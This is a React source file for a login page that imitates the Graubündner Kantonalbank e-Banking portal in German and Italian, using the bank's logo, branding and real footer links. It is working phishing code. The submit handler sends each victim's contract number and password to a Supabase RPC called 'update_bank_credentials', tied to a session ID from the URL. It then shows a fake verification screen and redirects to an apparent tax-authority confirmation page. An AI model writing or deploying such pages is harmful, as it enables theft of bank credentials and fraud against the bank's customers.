import { useState, useEffect, useRef } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, ChevronLeft, ChevronRight, ArrowRight } from "lucide-react";
import logoAsset from "@/assets/graubuendner-kantonalbank-logo.svg.asset.json";
import windowsAsset from "@/assets/gkb-windows10.jpg.asset.json";
import karteAsset from "@/assets/gkb-bestekarte.jpg.asset.json";

const BLUE = "#025dad";
const TITLE_BLUE = "#0051a4";

type Lang = "DE" | "IT";

const translations = {
  DE: {
    pageMeta: "Graubündner Kantonalbank – e-Banking",
    title: "GKB Login.",
    subtitle: "Melden Sie sich an, um fortzufahren.",
    labelUsername: "Vertragsnummer",
    labelPassword: "Passwort",
    submit: "Weiter",
    loading: "Anmeldedaten werden überprüft...",
    passwordToggle: "Passwort anzeigen",
    helpTitle: "Sie brauchen Hilfe?",
    helpLinks: [
      "Noch kein e-Banking? Hier Zugang bestellen.",
      "e-Banking Login mit CrontoSign Swiss App",
      "e-Banking Login mit GKB Mobile Banking App",
      "Passwort und Zugangsdaten verwalten",
      "Zugang sperren: e-Banking und Mobile Banking",
    ],
    slides: [
      {
        title: "Windows 10 nicht mehr nutzen.",
        text: "Microsoft beendet den regulären Support für Windows 10. Wechseln Sie jetzt auf Windows 11 und bleiben Sie sicher und up-to-date.",
        linkText: "Jetzt mehr erfahren.",
      },
      {
        title: "Die beste Karte für mehr.",
        text: "Freuen Sie sich auf attraktive Prämien zur Belohnung und Extras wie Reiseversicherungen.",
        linkText: "Mehr erfahren",
      },
    ],
    copyright: "© Graubündner Kantonalbank",
    footerLegal: "Rechtliche Hinweise",
    footerImpressum: "Impressum",
    footerPrivacy: "Datenschutzerklärung",
    footerCookie: "Cookie-Policy",
    prevSlide: "Vorheriges",
    nextSlide: "Nächstes",
  },
  IT: {
    pageMeta: "Banca Cantonale Grigione – e-Banking",
    title: "Login GKB.",
    subtitle: "Effettui il login per proseguire.",
    labelUsername: "Numero di contratto",
    labelPassword: "Password",
    submit: "Avanti",
    loading: "Verifica dei dati di accesso...",
    passwordToggle: "Mostra password",
    helpTitle: "Ha bisogno di aiuto?",
    helpLinks: [
      "Non ha ancora l'e-Banking? Richieda qui l'accesso.",
      "Login e-Banking con l'app CrontoSign Swiss",
      "Login e-Banking con l'app GKB Mobile Banking",
      "Gestire password e dati di accesso",
      "Bloccare l'accesso: e-Banking e Mobile Banking",
    ],
    slides: [
      {
        title: "Non utilizzi più Windows 10.",
        text: "Microsoft termina il supporto regolare per Windows 10. Passi ora a Windows 11 per restare sicuro e aggiornato.",
        linkText: "Scopra di più ora.",
      },
      {
        title: "La carta migliore per ottenere di più.",
        text: "Si rallegri di premi attrattivi come ricompensa ed extra come assicurazioni di viaggio.",
        linkText: "Scopra di più",
      },
    ],
    copyright: "© Banca Cantonale Grigione",
    footerLegal: "Note legali",
    footerImpressum: "Impressum",
    footerPrivacy: "Informativa sulla privacy",
    footerCookie: "Cookie-Policy",
    prevSlide: "Precedente",
    nextSlide: "Successivo",
  },
} as const;

const slideImages = [windowsAsset.url, karteAsset.url];

const footerLinks = [
  { key: "footerLegal" as const, href: "https://www.gkb.ch/de/rechtliches/rechtliche-hinweise" },
  { key: "footerImpressum" as const, href: "https://www.gkb.ch/de/rechtliches/impressum" },
  { key: "footerPrivacy" as const, href: "https://www.gkb.ch/de/rechtliches/datenschutzerklaerungen" },
  { key: "footerCookie" as const, href: "https://www.gkb.ch/de/rechtliches/datenschutzerklaerungen/cookie-policy" },
];

const ChGraubuendnerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [activeSlide, setActiveSlide] = useState(0);
  const [lang, setLang] = useState<Lang>("DE");
  const touchStartX = useRef(0);

  const t = translations[lang];

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta(t.pageMeta, logoAsset.url);

  const nextSlide = () => setActiveSlide((s) => (s + 1) % slideImages.length);
  const prevSlide = () => setActiveSlide((s) => (s - 1 + slideImages.length) % slideImages.length);

  useEffect(() => {
    const id = setInterval(() => setActiveSlide((s) => (s + 1) % slideImages.length), 5000);
    return () => clearInterval(id);
  }, []);

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message={t.loading}
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col" style={{ backgroundColor: "#f2f3f7" }}>
        {/* Header */}
        <div
          className="w-full flex items-center justify-between px-6 md:px-12"
          style={{
            height: 72,
            background: "linear-gradient(90deg, #0672c9 0%, #00519e 100%)",
            borderBottomRightRadius: 24,
          }}
        >
          <img src={logoAsset.url} alt="Graubündner Kantonalbank" className="h-[28px] md:h-[42px] w-auto" />
          <div className="flex items-center gap-2">
            {(["DE", "IT"] as const).map((l) => {
              const active = lang === l;
              return (
                <button
                  key={l}
                  onClick={() => setLang(l)}
                  className="w-10 h-10 rounded-full flex items-center justify-center text-[14px] font-bold transition-all"
                  style={
                    active
                      ? { backgroundColor: "#fff", color: TITLE_BLUE }
                      : { backgroundColor: "rgba(255,255,255,0.22)", color: "rgba(255,255,255,0.7)" }
                  }
                  aria-label={l}
                >
                  {l}
                </button>
              );
            })}
          </div>
        </div>

        <main className="flex-1 px-4 pt-6 md:pt-10 pb-10">
          {/* Login + Carousel wrapper — card visuals only on desktop */}
          <div
            className="w-full max-w-[980px] mx-auto flex flex-col md:flex-row md:h-[715px] md:bg-white md:overflow-hidden md:rounded-[6px] md:shadow-[0_2px_8px_-2px_rgba(0,0,0,0.08)]"
          >
            {/* Login (60%) */}
            <div className="md:w-3/5 flex flex-col px-0 md:px-12 pt-6 md:pt-20 pb-8 md:pb-16 order-1">
              <h1
                className="text-[22px] md:text-[26px] font-semibold mb-3"
                style={{ color: TITLE_BLUE }}
              >
                {t.title}
              </h1>
              <p className="text-[14px] mb-8" style={{ color: "#555" }}>
                {t.subtitle}
              </p>

              <div className="mb-5">
                <label className="block text-[13px] mb-1.5" style={{ color: "#333" }}>
                  {t.labelUsername}
                </label>
                <input
                  type="text"
                  value={vertragsnummer}
                  onChange={(e) => setVertragsnummer(e.target.value)}
                  className="w-full px-3 py-2.5 border border-[#e8eaef] md:border-[#cfd4dc] text-[15px] rounded-[4px] outline-none hover:border-black focus:border-black"
                />
              </div>

              <div className="mb-8">
                <label className="block text-[13px] mb-1.5" style={{ color: "#333" }}>
                  {t.labelPassword}
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    value={passwort}
                    onChange={(e) => setPasswort(e.target.value)}
                    className="w-full px-3 py-2.5 border border-[#e8eaef] md:border-[#cfd4dc] text-[15px] pr-10 rounded-[4px] outline-none hover:border-black focus:border-black"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 -translate-y-1/2"
                    aria-label={t.passwordToggle}
                  >
                    {showPassword ? <EyeOff size={18} color={BLUE} /> : <Eye size={18} color={BLUE} />}
                  </button>
                </div>
              </div>

              <div className="hidden md:block flex-1" />

              <button
                onClick={handleSubmit}
                className="mx-auto w-full max-w-[170px] py-2.5 text-white font-semibold text-[15px] rounded-full transition-all hover:brightness-95 mt-2"
                style={{ background: "linear-gradient(90deg, #0155a3 0%, #0672c9 100%)" }}
              >
                {t.submit}
              </button>
            </div>

            {/* Hilfe — mobile only, between login and carousel */}
            <div className="md:hidden order-2 mt-8 -mx-4 px-4 py-6 bg-white">
              <h2 className="text-[18px] font-semibold text-black mb-4">{t.helpTitle}</h2>
              <ul className="space-y-4">
                {t.helpLinks.map((text, i) => (
                  <li key={i} className="flex items-center gap-3">
                    <ArrowRight size={18} color={BLUE} className="shrink-0" />
                    <a href="#" style={{ color: BLUE }} className="text-[14px]">
                      {text}
                    </a>
                  </li>
                ))}
              </ul>
            </div>

            {/* Carousel (40%) */}
            <div
              className="md:w-2/5 relative overflow-hidden h-[350px] md:h-auto group order-3 md:order-none mt-[30px] md:mt-0 -mx-4 md:mx-0"
              style={{ backgroundColor: "#eaf1f8" }}
              onTouchStart={(e) => { touchStartX.current = e.touches[0].clientX; }}
              onTouchEnd={(e) => {
                const dx = e.changedTouches[0].clientX - touchStartX.current;
                if (dx > 40) prevSlide();
                else if (dx < -40) nextSlide();
              }}
            >
              {/* Images fill the full carousel column */}
              {slideImages.map((src, i) => (
                <img
                  key={i}
                  src={src}
                  alt={t.slides[i].title}
                  className="absolute inset-0 w-full h-full object-cover transition-opacity duration-700"
                  style={{ opacity: i === activeSlide ? 1 : 0 }}
                />
              ))}

              {/* Arrows - square, blue, vertically centered, only on hover */}
              <button
                onClick={prevSlide}
                aria-label={t.prevSlide}
                className="absolute left-3 top-1/2 -translate-y-1/2 w-9 h-9 flex items-center justify-center rounded-[4px] hover:brightness-110 transition-opacity opacity-0 group-hover:opacity-100 z-10"
                style={{ backgroundColor: BLUE }}
              >
                <ChevronLeft size={20} color="#fff" />
              </button>
              <button
                onClick={nextSlide}
                aria-label={t.nextSlide}
                className="absolute right-3 top-1/2 -translate-y-1/2 w-9 h-9 flex items-center justify-center rounded-[4px] hover:brightness-110 transition-opacity opacity-0 group-hover:opacity-100 z-10"
                style={{ backgroundColor: BLUE }}
              >
                <ChevronRight size={20} color="#fff" />
              </button>

              {/* Glass text card */}
              <div className="absolute bottom-4 left-4 right-4 z-10">
                <div className="w-full rounded-[6px] p-4 bg-white/40 backdrop-blur-md">
                  <h3 className="font-semibold text-[15px] mb-2 text-black leading-snug">
                    {t.slides[activeSlide].title}
                  </h3>
                  <p className="text-[13px] leading-relaxed mb-2 text-black/80">
                    {t.slides[activeSlide].text}{" "}
                    <a href="#" style={{ color: BLUE }} className="font-medium">
                      {t.slides[activeSlide].linkText}
                    </a>
                  </p>
                  <div className="flex items-center justify-center gap-2 mt-3">
                    {slideImages.map((_, i) => (
                      <button
                        key={i}
                        onClick={() => setActiveSlide(i)}
                        aria-label={`Slide ${i + 1}`}
                        className="rounded-full transition-all"
                        style={{
                          height: 7,
                          width: 7,
                          backgroundColor: i === activeSlide ? BLUE : "rgba(255,255,255,0.7)",
                        }}
                      />
                    ))}
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Hilfe Card — desktop only */}
          <div
            className="hidden md:block w-full max-w-[980px] mx-auto bg-white rounded-[6px] mt-6 px-12 py-8"
            style={{ boxShadow: "0 2px 8px -2px rgba(0,0,0,0.08)" }}
          >
            <h2 className="text-[18px] font-semibold text-black mb-5">{t.helpTitle}</h2>
            <ul className="space-y-4">
              {t.helpLinks.map((text, i) => (
                <li key={i} className="flex items-center gap-3">
                  <ArrowRight size={18} color={BLUE} className="shrink-0" />
                  <a href="#" style={{ color: BLUE }} className="text-[14px]">
                    {text}
                  </a>
                </li>
              ))}
            </ul>
          </div>
        </main>

        {/* Footer */}
        <footer className="pb-6 px-6 md:px-12 text-[13px]" style={{ color: BLUE }}>
          <div className="flex flex-col gap-4 md:flex-row md:items-center md:justify-between">
            <span className="order-2 md:order-none text-center md:text-left">{t.copyright}</span>
            <div className="order-1 md:order-none flex flex-col items-start gap-2 md:flex-row md:items-center md:gap-5">
              {footerLinks.map((l) => (
                <a
                  key={l.key}
                  href={l.href}
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  {t[l.key]}
                </a>
              ))}
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChGraubuendnerKantonalbank;
